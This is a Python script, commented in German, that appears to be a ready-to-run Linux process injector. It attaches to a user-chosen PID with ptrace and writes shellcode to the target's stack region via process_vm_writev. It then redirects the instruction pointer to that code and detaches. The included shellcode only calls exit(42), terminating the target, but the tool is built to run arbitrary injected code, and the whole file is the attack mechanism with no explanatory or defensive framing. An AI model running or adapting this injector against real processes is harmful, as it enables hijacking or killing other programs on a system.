import os
import ctypes
import ctypes.util
import struct
import time
from rich.console import Console
from rich.panel import Panel
from rich.text import Text

console = Console()

# Load libc
libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)

# ptrace constants
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13

# user_regs_struct für x86_64
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong)
    ]

# Shellcode: exit(42) syscall
shellcode = bytes([
    0x48, 0x31, 0xff,
    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc7, 0x2a, 0x00, 0x00, 0x00,
    0x0f, 0x05
])

# Target PID holen
target_pid = int(input("Ziel-PID: "))

console.rule("[bold blue] 🧩 Injector gestartet")

# Attach
with console.status("[yellow]Attach an Zielprozess...[/yellow]", spinner="dots"):
    if libc.ptrace(PTRACE_ATTACH, target_pid, None, None) != 0:
        console.print("[red]❌ ptrace attach failed.[/red]")
        exit(1)
    os.waitpid(target_pid, 0)

console.print("[green]✔️ Erfolgreich attached![/green]")

# Register auslesen
regs = user_regs_struct()
if libc.ptrace(PTRACE_GETREGS, target_pid, None, ctypes.byref(regs)) != 0:
    console.print("[red]❌ Konnte Register nicht lesen.[/red]")
    exit(1)

# Neue Adresse (Stackbereich)
injection_address = regs.rsp - 0x100
console.print(Panel(f"[bold cyan]Aktuelle RIP:[/bold cyan] [bold]{hex(regs.rip)}", title="RIP vorher"))
console.print(f"[yellow]📍 Neue Injektionsadresse (im Stack): {hex(injection_address)}[/yellow]")

# Optionaler Dump vom Shellcode
console.print(Panel(Text(shellcode.hex(" "), style="bold green"), title="Shellcode Hexdump"))

# Schreibvorgang mit process_vm_writev
class IOVec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]

local_iov = ctypes.create_string_buffer(bytes(shellcode))
remote_iov = IOVec(ctypes.c_void_p(injection_address), len(shellcode))
local_iov_struct = IOVec(ctypes.cast(local_iov, ctypes.c_void_p), len(shellcode))

console.print(f"[yellow]📤 Injektion nach {hex(injection_address)} läuft...[/yellow]")

process_vm_writev = libc.process_vm_writev
process_vm_writev.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.c_ulong]
n = process_vm_writev(target_pid, ctypes.byref(local_iov_struct), 1, ctypes.byref(remote_iov), 1, 0)

if n < 0:
    console.print("[red]❌ process_vm_writev failed.[/red]")
    exit(1)

console.print(f"[green]✔️ {n} Bytes erfolgreich injiziert.[/green]")

# RIP auf neue Adresse setzen
regs.rip = injection_address
if libc.ptrace(PTRACE_SETREGS, target_pid, None, ctypes.byref(regs)) != 0:
    console.print("[red]❌ Konnte RIP nicht setzen.[/red]")
    exit(1)
else:
    console.print(f"[green]✔️ RIP auf {hex(injection_address)} gesetzt.[/green]")

# Detach
if libc.ptrace(PTRACE_DETACH, target_pid, None, None) != 0:
    console.print("[red]❌ Detach fehlgeschlagen.[/red]")
    exit(1)

console.print("[bold green]🎯 Injection abgeschlossen und Prozess freigegeben![/bold green]")
console.rule("[bold blue]🏁 Fertig")
